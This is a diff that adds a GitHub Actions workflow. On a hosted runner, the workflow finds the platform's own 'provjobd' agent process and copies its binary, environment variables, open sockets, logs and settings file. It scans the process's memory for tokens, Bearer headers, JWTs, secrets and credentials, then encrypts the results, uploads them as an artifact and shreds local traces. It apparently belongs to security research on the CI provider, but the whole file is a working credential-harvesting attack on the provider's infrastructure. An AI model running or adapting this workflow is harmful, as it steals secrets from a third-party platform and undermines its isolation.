@@ -1,0 +1,148 @@
+name: f004-provjobd-encrypted-capture
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    env:
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+    steps:
+      - name: Capture encrypted provjobd authority surface
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          raw="$RUNNER_TEMP/f004-provjobd-raw"
+          sealed="$RUNNER_TEMP/f004-provjobd-sealed"
+          mkdir -p "$raw/memory" "$sealed"
+
+          pid=$(pgrep -o -f '^/tmp/provjobd[0-9]+$')
+          test -n "$pid"
+          sudo cp "/proc/$pid/exe" "$raw/provjobd"
+          sudo cp "/proc/$pid/maps" "$raw/provjobd.maps"
+          sudo cp "/proc/$pid/status" "$raw/provjobd.status"
+          sudo cp "/proc/$pid/limits" "$raw/provjobd.limits"
+          sudo cp "/proc/$pid/mountinfo" "$raw/provjobd.mountinfo"
+          sudo sh -c "tr '\\0' '\\n' < /proc/$pid/environ" > "$raw/provjobd.environ"
+          sudo sh -c "tr '\\0' ' ' < /proc/$pid/cmdline" > "$raw/provjobd.cmdline"
+          printf '\n' >> "$raw/provjobd.cmdline"
+          sudo readlink "/proc/$pid/exe" > "$raw/provjobd.exe-link"
+          sudo readlink "/proc/$pid/cwd" > "$raw/provjobd.cwd-link"
+          sudo readlink "/proc/$pid/root" > "$raw/provjobd.root-link"
+          sudo ls -la "/proc/$pid/fd" > "$raw/provjobd.fds"
+          sudo ss -tpne > "$raw/tcp-connections.txt"
+          sudo ss -upne > "$raw/udp-connections.txt"
+          ps -eo user,pid,ppid,stat,lstart,args ww > "$raw/processes.txt"
+          sudo journalctl --no-pager -u hosted-compute-agent.service > "$raw/hca-journal.txt" || true
+          sudo journalctl --no-pager _PID="$pid" > "$raw/provjobd-journal.txt" || true
+          sudo cp /opt/hca/provjobd_override.json "$raw/provjobd_override.json" 2>/dev/null || true
+          sudo cp /opt/hca/.settings "$raw/hca.settings"
+
+          sudo python3 - "$pid" "$raw/memory" <<'PY'
+          import os
+          import pathlib
+          import re
+          import sys
+
+          pid = int(sys.argv[1])
+          output = pathlib.Path(sys.argv[2])
+          output.mkdir(parents=True, exist_ok=True)
+          maps = pathlib.Path(f'/proc/{pid}/maps').read_text().splitlines()
+          needles = [
+              b'https://', b'http://', b'github', b'Authorization', b'Bearer ',
+              b'eyJ', b'token', b'Token', b'secret', b'Secret', b'credential',
+              b'provjob', b'watchdog', b'orchestration', b'runner', b'abuse',
+          ]
+          manifest = []
+          seen = set()
+          with open(f'/proc/{pid}/mem', 'rb', buffering=0) as mem:
+              for line in maps:
+                  fields = line.split()
+                  if len(fields) < 2 or 'r' not in fields[1]:
+                      continue
+                  start_text, end_text = fields[0].split('-')
+                  start = int(start_text, 16)
+                  end = int(end_text, 16)
+                  if end <= start or end - start > 512 * 1024 * 1024:
+                      continue
+                  position = start
+                  overlap = b''
+                  while position < end:
+                      size = min(1024 * 1024, end - position)
+                      try:
+                          chunk = os.pread(mem.fileno(), size, position)
+                      except OSError:
+                          break
+                      data = overlap + chunk
+                      base = position - len(overlap)
+                      for needle in needles:
+                          cursor = 0
+                          while True:
+                              index = data.find(needle, cursor)
+                              if index < 0:
+                                  break
+                              absolute = base + index
+                              page = absolute // 4096
+                              if page not in seen:
+                                  seen.add(page)
+                                  window_start = max(start, absolute - 65536)
+                                  window_end = min(end, absolute + 65536)
+                                  try:
+                                      window = os.pread(mem.fileno(), window_end - window_start, window_start)
+                                  except OSError:
+                                      window = b''
+                                  if window:
+                                      name = f'{len(seen):04d}-{absolute:x}.bin'
+                                      (output / name).write_bytes(window)
+                                      manifest.append(f'{name}\t0x{absolute:x}\t{needle.decode(errors="replace")}\t{len(window)}')
+                              cursor = index + len(needle)
+                      overlap = data[-262144:]
+                      position += size
+          (output / 'manifest.txt').write_text('\n'.join(manifest) + '\n')
+          if not seen:
+              raise SystemExit('no targeted provjobd memory windows captured')
+          PY
+
+          sudo chown -R "$USER:$USER" "$raw"
+          chmod -R u=rwX,go= "$raw"
+          binary_sha=$(shasum -a 256 "$raw/provjobd" | awk '{print $1}')
+          memory_files=$(find "$raw/memory" -type f -name '*.bin' | wc -l | tr -d ' ')
+          printf '%s\n' "$GITHUB_RUN_ID:f004-provjobd-capture" > "$raw/owned-canary.txt"
+          jq -n \
+            --arg repository "$GITHUB_REPOSITORY" \
+            --arg run_id "$GITHUB_RUN_ID" \
+            --arg runner_name "$RUNNER_NAME" \
+            --arg binary_sha256 "$binary_sha" \
+            --argjson memory_files "$memory_files" \
+            '{repository:$repository,run_id:$run_id,runner_name:$runner_name,binary_sha256:$binary_sha256,memory_files:$memory_files}' \
+            > "$sealed/metadata.json"
+
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          tar -C "$raw" -cf "$RUNNER_TEMP/f004-provjobd.tar" .
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$RUNNER_TEMP/f004-provjobd.tar" \
+            -outform DER \
+            -out "$sealed/payload.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/payload.cms" | awk '{print $1}' > "$sealed/payload.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-provjobd.tar" "$RUNNER_TEMP/f004-certificate.pem"
+          sudo rm -rf "$raw"
+
+      - name: Upload encrypted capture
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-provjobd-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-provjobd-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Hold controlled worker live
+        shell: bash
+        run: sleep 480
